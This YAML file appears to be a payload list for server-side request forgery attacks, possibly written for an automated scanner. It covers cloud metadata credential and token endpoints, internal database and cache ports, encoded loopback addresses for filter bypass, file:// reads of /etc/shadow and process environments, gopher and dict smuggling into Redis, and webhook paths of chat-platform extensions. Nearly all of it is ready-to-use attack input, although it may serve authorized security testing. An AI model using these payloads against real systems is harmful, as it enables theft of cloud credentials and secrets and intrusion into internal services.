aws_imds:
  - "http://169.254.169.254/latest/meta-data/"
  - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  - "http://169.254.169.254/latest/meta-data/hostname"
  - "http://169.254.169.254/latest/meta-data/local-ipv4"
  - "http://169.254.169.254/latest/user-data"
  - "http://169.254.169.254/latest/dynamic/instance-identity/document"

aws_imds_v2:
  - "TOKEN_HEADER:X-aws-ec2-metadata-token-ttl-seconds:21600"
  - "http://169.254.169.254/latest/api/token"
  - "http://169.254.169.254/latest/meta-data/"

gcp_metadata:
  - "http://metadata.google.internal/computeMetadata/v1/"
  - "http://metadata.google.internal/computeMetadata/v1/project/project-id"
  - "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
  - "http://metadata.google.internal/computeMetadata/v1/instance/hostname"
  - "http://metadata.google.internal/computeMetadata/v1/instance/zone"

azure_imds:
  - "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
  - "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
  - "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01"

digitalocean:
  - "http://169.254.169.254/metadata/v1/"
  - "http://169.254.169.254/metadata/v1/hostname"
  - "http://169.254.169.254/metadata/v1/id"
  - "http://169.254.169.254/metadata/v1/region"

internal_services:
  - "http://127.0.0.1:11434/api/tags"
  - "http://127.0.0.1:11434/api/version"
  - "http://localhost:6379"
  - "http://127.0.0.1:9200"
  - "http://127.0.0.1:9200/_cluster/health"
  - "http://127.0.0.1:5432"
  - "http://127.0.0.1:3306"
  - "http://127.0.0.1:27017"
  - "http://127.0.0.1:8500/v1/agent/self"
  - "http://127.0.0.1:2379/version"

ip_bypass:
  - "http://0x7f000001/"
  - "http://2130706433/"
  - "http://0177.0.0.1/"
  - "http://127.1/"
  - "http://[::1]/"
  - "http://0.0.0.0/"
  - "http://①②⑦.⓪.⓪.①/"
  - "http://127.0.0.1.nip.io/"
  - "http://0x7f.0x0.0x0.0x1/"
  - "http://017700000001/"

protocol_smuggling:
  - "file:///etc/passwd"
  - "file:///etc/shadow"
  - "file:///proc/self/environ"
  - "gopher://127.0.0.1:25/"
  - "gopher://127.0.0.1:6379/_INFO"
  - "dict://127.0.0.1:6379/"
  - "dict://127.0.0.1:6379/INFO"
  - "tftp://127.0.0.1/etc/passwd"

# IPv6 SSRF bypass (CVE-2026-28476 pattern)
ipv6_bypass:
  - "http://[::ffff:127.0.0.1]/"
  - "http://[::ffff:7f00:1]/"
  - "http://[0:0:0:0:0:ffff:127.0.0.1]/"
  - "http://[::1]/"
  - "http://[::1]:8080/"
  - "http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/"
  - "http://[::ffff:169.254.169.254]/latest/meta-data/"
  - "http://[::ffff:a9fe:a9fe]/latest/meta-data/"
  - "http://[::ffff:10.0.0.1]/"
  - "http://[::ffff:172.16.0.1]/"

# Attachment/media URL hydration SSRF
attachment_ssrf:
  - "http://169.254.169.254/latest/meta-data/"
  - "http://metadata.google.internal/computeMetadata/v1/"
  - "file:///etc/passwd"
  - "http://127.0.0.1:11434/api/tags"
  - "http://127.0.0.1:6379/"
  - "http://127.0.0.1:9200/_cluster/health"
  - "gopher://127.0.0.1:6379/_INFO"

# Extension-specific SSRF endpoints
extension_ssrf:
  - "/api/v1/extensions/tlon/auth"
  - "/api/v1/extensions/feishu/webhook"
  - "/api/v1/extensions/feishu/callback"
  - "/api/v1/extensions/slack/events"
  - "/api/v1/extensions/telegram/webhook"
  - "/api/v1/extensions/discord/webhook"
